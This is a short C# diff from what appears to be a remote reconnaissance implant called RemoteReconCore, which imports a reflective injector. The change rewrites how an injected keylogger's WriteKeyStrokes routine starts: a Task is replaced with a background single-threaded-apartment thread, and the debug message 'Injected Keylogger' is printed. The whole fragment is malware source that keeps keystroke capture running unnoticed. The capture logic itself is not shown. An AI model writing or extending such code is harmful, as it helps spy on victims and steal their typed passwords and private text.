@@ -4,7 +4,6 @@ using System.IO.Pipes;
 using System.IO;
 using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
 using ReflectiveInjector;
 
 namespace RemoteReconCore
@@ -29,9 +28,12 @@ namespace RemoteReconCore
 #if DEBUG 
                 Console.WriteLine("Injected Keylogger");
 #endif
-                Action runner = new Action(WriteKeyStrokes);
-                Task t = new Task(runner);
-
+                Thread t = new Thread(() =>
+                {
+                    WriteKeyStrokes();
+                });
+                t.SetApartmentState(ApartmentState.STA);
+                t.IsBackground = true;
                 t.Start();
 #if DEBUG
                 Console.WriteLine("Started background thread to sync keylogger");
